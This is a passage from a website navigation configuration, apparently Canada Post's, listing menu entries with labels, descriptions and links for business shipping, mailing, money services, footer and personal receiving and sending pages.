                  
                },
              
              
                {
                  "label": "Deliver to a post office",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Offer post office pickup of purchases to your customers.",
                  
                    "link": "/cpc/en/business/ecommerce/enhance/deliver-to-post-office.page?",
                    "linkCMSPage": "business/ecommerce/enhance/deliver-to-post-office",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Simplify returns",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Create the best returns experience for your customers.",
                  
                    "link": "/cpc/en/business/shipping/returns.page?",
                    "linkCMSPage": "business/shipping/returns",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Integrate with our APIs",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Use free APIs to integrate our services directly with your website.",
                  
                    "link": "/cpc/en/business/ecommerce/integrate-apis.page?",
                    "linkCMSPage": "business/ecommerce/integrate-apis",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Get e-commerce resources and articles",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Business Matters blog.",
                  
                    "link": "/blogs/business/category/ecommerce/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Small business",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Small business overview",
                 
                    "description": "Learn about shipping tools and discounts tailored for small business.",
                  
                    "link": "/cpc/en/business/small-business.page?",
                    "linkCMSPage": "business/small-business",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Shipping discounts",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about savings program discount levels.",
                  
                    "link": "/cpc/en/business/small-business/shipping-discounts.page?",
                    "linkCMSPage": "business/small-business/shipping-discounts",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Start selling online",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about setting up your online store with our partners. ",
                  
                    "link": "/cpc/en/business/ecommerce/start-selling-online.page?",
                    "linkCMSPage": "business/ecommerce/start-selling-online",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Exclusive discounts",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/small-business/third-party-discounts.page?",
                    "linkCMSPage": "business/small-business/third-party-discounts",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Direct mail discounts",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about small business savings on direct mail marketing campaigns.",
                  
                    "link": "/cpc/en/business/small-business/direct-mail-savings.page?",
                    "linkCMSPage": "business/small-business/direct-mail-savings",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Snap Ship",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Create shipping labels online and access discounted rates.",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship/snap-ship.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship/snap-ship",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Postal services",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Postal services overview",
                 
                    "description": "Learn about mailing services to support your business operations.",
                  
                    "link": "/cpc/en/business/postal-services.page?",
                    "linkCMSPage": "business/postal-services",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Mailing",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about services to manage your business mailings.",
                  
                    "link": "/cpc/en/business/postal-services/mailing.page?",
                    "linkCMSPage": "business/postal-services/mailing",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Get business letter discounts",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about savings on large-volume business correspondence mail. ",
                  
                    "link": "/cpc/en/business/postal-services/mailing/letter-discounts.page?",
                    "linkCMSPage": "business/postal-services/mailing/letter-discounts",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Send publications",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Access lower postage rates on magazines, newspapers and newsletters.",
                  
                    "link": "/cpc/en/business/postal-services/mailing/send-publications.page?",
                    "linkCMSPage": "business/postal-services/mailing/send-publications",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Prepaid reply mail",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Include postage-paid return mail as part of direct mail campaigns.",
                  
                    "link": "/cpc/en/business/postal-services/mailing/prepaid-reply-mail.page?",
                    "linkCMSPage": "business/postal-services/mailing/prepaid-reply-mail",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Design and track reply mail",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/postal-services/mailing/prepaid-reply-mail/design-track.page?",
                    "linkCMSPage": "business/postal-services/mailing/prepaid-reply-mail/design-track",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Forward your mail",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Forward mail to a new or temporary address.",
                  
                    "link": "/cpc/en/personal/receiving/manage-mail/mail-forwarding.page?",
                    "linkCMSPage": "personal/receiving/manage-mail/mail-forwarding",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Hold your mail",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Temporarily stop mail delivery to your address.",
                  
                    "link": "/cpc/en/personal/receiving/manage-mail/hold-mail.page?",
                    "linkCMSPage": "personal/receiving/manage-mail/hold-mail",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Register your mail",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Pay a flat rate for Registered Mail™ and get a signature upon arrival.",
                  
                    "link": "/cpc/en/business/postal-services/mailing/register.page?",
                    "linkCMSPage": "business/postal-services/mailing/register",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Money services and prepaid cards",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about worldwide money transfers and buying secure, prepaid cards.",
                  
                    "link": "/cpc/en/business/postal-services/money-prepaid-cards.page?",
                    "linkCMSPage": "business/postal-services/money-prepaid-cards",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Money orders",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Send certified cashable documents securely through the mail.",
                  
                    "link": "/cpc/en/business/postal-services/money-prepaid-cards/money-orders.page?",
                    "linkCMSPage": "business/postal-services/money-prepaid-cards/money-orders",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Prepaid credit cards",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Buy prepaid cards at the post office for shopping and travel.",
                  
                    "link": "/cpc/en/business/postal-services/money-prepaid-cards/credit-cards.page?",
                    "linkCMSPage": "business/postal-services/money-prepaid-cards/credit-cards",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Gift cards and prepaid products",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Buy gift cards and phone vouchers at the post office. ",
                  
                    "link": "/cpc/en/business/postal-services/money-prepaid-cards/mobile-top-ups-prepaid-products.page?",
                    "linkCMSPage": "business/postal-services/money-prepaid-cards/mobile-top-ups-prepaid-products",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Find a post office",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/fpo/personal/findpostoffice",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Rent a post office box",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Get your business mail delivered to a secure Postal Box.",
                  
                    "link": "/cpc/en/business/postal-services/rent-postal-box.page?",
                    "linkCMSPage": "business/postal-services/rent-postal-box",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Digital mail and document sharing",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Send pay statements and tax forms or large files to employees securely.",
                  
                    "link": "/cpc/en/business/postal-services/digital-mail.page?",
                    "linkCMSPage": "business/postal-services/digital-mail",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Share confidential files digitally (Connect)",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Securely send messages and documents outside your corporate firewall.",
                  
                    "link": "/cpc/en/business/postal-services/digital-mail/epost-connect.page?",
                    "linkCMSPage": "business/postal-services/digital-mail/epost-connect",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Send digital mail securely",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Send customers and employees bills and statements to a secure inbox.",
                  
                    "link": "/cpc/en/business/postal-services/digital-mail/epost.page?",
                    "linkCMSPage": "business/postal-services/digital-mail/epost",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Verify customer identity",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Setup Digital Proof of Identity to protect against fraud and theft.",
                  
                    "link": "/cpc/en/business/postal-services/digital-proof-identity.page?",
                    "linkCMSPage": "business/postal-services/digital-proof-identity",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Purchase stamps and meters",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Choose your postage and save on frequent or large business mailing.",
                  
                    "link": "/cpc/en/business/postal-services/stamps-meters.page?",
                    "linkCMSPage": "business/postal-services/stamps-meters",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Shop",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Shop for stamps, shipping supplies and collectibles.",
                  
                    "link": "/store-boutique/en/home",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Request a parcel locker",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Get a free parcel locker installed in your building for residents.  ",
                  
                    "link": "/cpc/en/business/postal-services/order-parcel-locker.page?",
                    "linkCMSPage": "business/postal-services/order-parcel-locker",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Billing and Invoices",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn how to build customized invoices for your business.",
                  
                    "link": "/cpc/en/business/postal-services/commercial-invoices.page?",
                    "linkCMSPage": "business/postal-services/commercial-invoices",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Articles and resources",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Business Matters home",
                 
                    "description": "Access articles with ideas and tips to support your business operations.",
                  
                    "link": "/blogs/business/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "All posts in shipping",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/blogs/business/category/shipping/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Shipping articles",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/blogs/business/category/shipping/shipping-insights",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Shipping resources",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/blogs/business/category/shipping/shipping-resources/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Shipping events",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/events/featured.page?",
                    "linkCMSPage": "business/marketing/events/featured",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "All posts in marketing",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/blogs/business/category/marketing/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Marketing articles",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/blogs/business/category/marketing/marketing-insights",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Marketing resources",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/blogs/business/category/marketing/marketing-resources",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Marketing events",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/events/marketing.page?",
                    "linkCMSPage": "business/marketing/events/marketing",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "All posts in e-commerce",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/blogs/business/category/ecommerce/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "E-commerce articles",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/blogs/business/category/ecommerce/ecommerce-insights",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "E-commerce resources",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/blogs/business/category/ecommerce/ecommerce-resources",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "E-commerce events",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/events/ecommerce.page?",
                    "linkCMSPage": "business/marketing/events/ecommerce",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Utility",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Support",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Get answers to common questions and other details on our services.",
                  
                    "link": "/cpc/en/support.page?",
                    "linkCMSPage": "support",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "PersonalBusiness",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Personal",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "personal",
                  
                    "link": "/cpc/en/personal.page?",
                    "linkCMSPage": "personal",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Business",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "business",
                  
                    "link": "/cpc/en/business.page?",
                    "linkCMSPage": "business",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Our company",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Our company",
                  
                    "link": "/cpc/en/our-company.page?",
                    "linkCMSPage": "our-company",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Store",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "store",
                  
                    "link": "/store-boutique/en/home",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Tools",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "tools",
                  
                    "link": "/cpc/en/tools.page?",
                    "linkCMSPage": "tools",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Footer",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Support",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Support",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Need help?",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/support.page?",
                    "linkCMSPage": "support",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Contact us",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/support.page#panel2-1",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Follow Us",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Follow Us",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Facebook",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                    "target": "_blank",
                  
                },
              
              
                {
                  "label": "Twitter",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "http://twitter.com",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Instagram",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                },
              
              
                {
                  "label": "LinkedIn",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Corporate",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Corporate",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "About us",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us.page?",
                    "linkCMSPage": "our-company/about-us",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Media centre",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/news-and-media/media-centre.page?",
                    "linkCMSPage": "our-company/news-and-media/media-centre",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Careers",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/jobs.page?",
                    "linkCMSPage": "our-company/jobs",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "I'm an employee",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "https://infopost.ca/",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Talent Zone",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "https://mysite.canadapost.ca/saml2/idp/sso?saml2sp=https%3A%2F%2Fwww.successfactors.com%2FS000016952T1&RelayState=%2Fsf%2Fhome",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Negotiations Updates",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page?",
                    "linkCMSPage": "our-company/news-and-media/corporate-news/negotiations-list",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Blogs",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Blogs",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Business Matters",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/blogs/business",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Canada Post Magazine",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/blogs/personal",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Terms",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Accessibility",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-responsibility/accessibility.page?",
                    "linkCMSPage": "our-company/about-us/corporate-responsibility/accessibility",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Legal",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/support/kb/general-inquiries/general-information/legal-terms-of-use-and-conditions",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Privacy",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page?",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Research",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/research-panel.page",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Personal",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about mailing services for individuals.",
                  
                    "link": "/cpc/en/personal.page?",
                    "linkCMSPage": "personal",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Receiving",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Receiving overview",
                 
                    "description": "Learn about the different ways to receive your mail and packages.",
                  
                    "link": "/cpc/en/personal/receiving.page?",
                    "linkCMSPage": "personal/receiving",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Manage your mail",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about residential community mailboxes and moving mail services.",
                  
                    "link": "/cpc/en/personal/receiving/manage-mail.page?",
                    "linkCMSPage": "personal/receiving/manage-mail",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Forward your mail",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Forward mail to a new or temporary address.",
                  
                    "link": "/cpc/en/personal/receiving/manage-mail/mail-forwarding.page?",
                    "linkCMSPage": "personal/receiving/manage-mail/mail-forwarding",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Customized Mail Forwarding for commercial customers",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/receiving/manage-mail/mail-forwarding/custom-commercial.page?",
                    "linkCMSPage": "personal/receiving/manage-mail/mail-forwarding/custom-commercial",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Hold your mail",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Temporarily stop mail delivery to your address.",
                  
                    "link": "/cpc/en/personal/receiving/manage-mail/hold-mail.page?",
                    "linkCMSPage": "personal/receiving/manage-mail/hold-mail",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Get bills and statements online (epost)",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Set up a free account to get bills and statements securely, online.",
                  
                    "link": "/cpc/en/personal/receiving/manage-mail/epost.page?",
                    "linkCMSPage": "personal/receiving/manage-mail/epost",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Alternative delivery options",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about receiving mail at the post office and condo parcel lockers.",
                  
                    "link": "/cpc/en/personal/receiving/alternative-delivery.page?",
                    "linkCMSPage": "personal/receiving/alternative-delivery",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Deliver purchases to post office (FlexDelivery)",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Have packages sent to the post office for pickup. ",
                  
                    "link": "/cpc/en/personal/receiving/alternative-delivery/flexdelivery.page?",
                    "linkCMSPage": "personal/receiving/alternative-delivery/flexdelivery",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Rent a post office box",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Rent a secure PO box to receive mail and packages.",
                  
                    "link": "/cpc/en/personal/receiving/alternative-delivery/post-office-box.page?",
                    "linkCMSPage": "personal/receiving/alternative-delivery/post-office-box",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Parcel lockers",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Pick up packages from the locker in your condo or apartment building.",
                  
                    "link": "/cpc/en/personal/receiving/alternative-delivery/parcel-lockers.page?",
                    "linkCMSPage": "personal/receiving/alternative-delivery/parcel-lockers",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Moving to a new home",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about mail forwarding and accessing your new community mailbox.",
                  
                    "link": "/cpc/en/personal/receiving/moving-house.page?",
                    "linkCMSPage": "personal/receiving/moving-house",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Track a package",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about tracking, delivery notice cards and reference numbers.",
                  
                    "link": "/track-reperage/en",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Automatic tracking",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/receiving/automatic-tracking.page?",
                    "linkCMSPage": "personal/receiving/automatic-tracking",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Find a post office",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/fpo/personal/findpostoffice",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Our mobile app",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about our free app and get package updates on the go. ",
                  
                    "link": "/cpc/en/personal/receiving/mobile-app.page?",
                    "linkCMSPage": "personal/receiving/mobile-app",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Sending",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Sending overview",
                 
                    "description": "View postage rates and shipping services for mail and packages.",
                  
                    "link": "/cpc/en/personal/sending.page?",
                    "linkCMSPage": "personal/sending",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Letters and mail",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about postage prices and mail sizing.",
                  
                    "link": "/cpc/en/personal/sending/letters-mail.page?",
                    "linkCMSPage": "personal/sending/letters-mail",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Postage rates",
                  "visibleInSiteMap": "true",
